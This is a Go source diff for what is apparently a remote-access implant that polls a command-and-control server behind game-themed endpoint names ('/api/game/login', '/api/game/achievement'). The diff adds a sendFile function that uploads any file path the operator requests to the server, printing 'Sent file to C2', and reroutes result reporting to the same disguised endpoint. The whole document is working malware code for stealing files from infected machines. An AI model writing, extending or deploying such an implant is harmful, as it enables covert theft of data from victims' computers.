@@ -25,6 +25,7 @@ import (
 	"io"
 	"io/ioutil"
 	"mime"
+	"mime/multipart"
 	"net/http"
 	"net/url"
 	"os"
@@ -38,6 +39,7 @@ var cuid string
 var key string
 var register = "/api/game/login"
 var taskboard = "/api/game"
+var drop = "/api/game/achievement"
 var apiRoot string
 var beaconTime int
 var cmdTimeOut int
@@ -105,6 +107,8 @@ func taskLoop() {
 				} else if val, ok := task["get"]; ok {
 					path := val.(string)
 					fmt.Println("Got request for: " + path)
+					sendFile(tuid, path)
+					fmt.Println("Sent file to C2")
 
 				}
 			}
@@ -123,7 +127,7 @@ func getTask() (map[string]interface{}, bool) {
 	// Close the resources when getTask() finishes
 	response, err := client.Do(r)
 	if err != nil {
-		println("error encountered:" + err.Error())
+		fmt.Println("error encountered:" + err.Error())
 		return nil, false
 	}
 	defer response.Body.Close()
@@ -147,7 +151,7 @@ func getTask() (map[string]interface{}, bool) {
 		defer out.Close()
 		io.Copy(out, response.Body)
 		os.Rename(temp, name)
-		println("Downloaded " + name)
+		fmt.Println("Downloaded " + name)
 	}
 	return nil, false
 }
@@ -201,15 +205,62 @@ func sendResult(tuid string, result string) bool {
 		Timeout: time.Second * time.Duration(10),
 	}
 	data := strings.NewReader(url.Values{"cuid": {cuid}, "key": {key}, "tuid": {tuid}, "data": {result}}.Encode())
-	r, _ := http.NewRequest(http.MethodPut, apiRoot+taskboard, data)
-	r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	r, _ := http.NewRequest(http.MethodPost, apiRoot+drop, data)
 	response, err := client.Do(r)
 	if err != nil {
-		println("error encountered when putting: " + err.Error())
+		fmt.Println("error encountered when putting: " + err.Error())
 	}
 	defer response.Body.Close()
 	if response.StatusCode == 200 {
 		return true
 	}
 	return false
+}
+
+func sendFile(tuid string, path string) bool {
+	var err error
+	var f *os.File
+	var fi os.FileInfo
+	var db bytes.Buffer
+
+	if f, err = os.Open(path); err != nil {
+		db.WriteString(err.Error())
+	}
+	if fi, err = f.Stat(); err != nil {
+		db.WriteString(err.Error())
+	}
+
+	r, w := io.Pipe()
+	mpw := multipart.NewWriter(w)
+	go func() {
+		var part io.Writer
+		defer w.Close()
+		defer f.Close()
+
+		if part, err = mpw.CreateFormFile("file", fi.Name()); err != nil {
+			db.WriteString(err.Error())
+		}
+		if _, err = io.Copy(part, f); err != nil {
+			db.WriteString(err.Error())
+		}
+
+		params := map[string]string{"cuid": cuid, "key": key, "tuid": tuid}
+
+		for key, val := range params {
+			mpw.WriteField(key, val)
+		}
+		mpw.WriteField("data", db.String())
+
+		if err = mpw.Close(); err != nil {
+			db.WriteString(err.Error())
+		}
+
+	}()
+
+	resp, err := http.Post(apiRoot+drop, mpw.FormDataContentType(), r)
+	if err != nil {
+		return false
+	}
+	defer resp.Body.Close()
+	return true
 }
